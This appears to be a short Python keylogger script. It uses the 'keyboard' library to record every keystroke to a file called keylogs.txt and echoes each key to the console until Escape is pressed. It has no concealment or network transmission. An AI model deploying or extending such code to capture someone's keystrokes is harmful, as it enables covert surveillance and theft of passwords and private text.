import keyboard

with open('keylogs.txt', 'a') as f:
    while True:
        key = keyboard.read_key()
        if key == '\x1b':
            break
        if key.isprintable():
            f.write(key)
        else:
            f.write('[' + key + ']')
        print(key, end='')
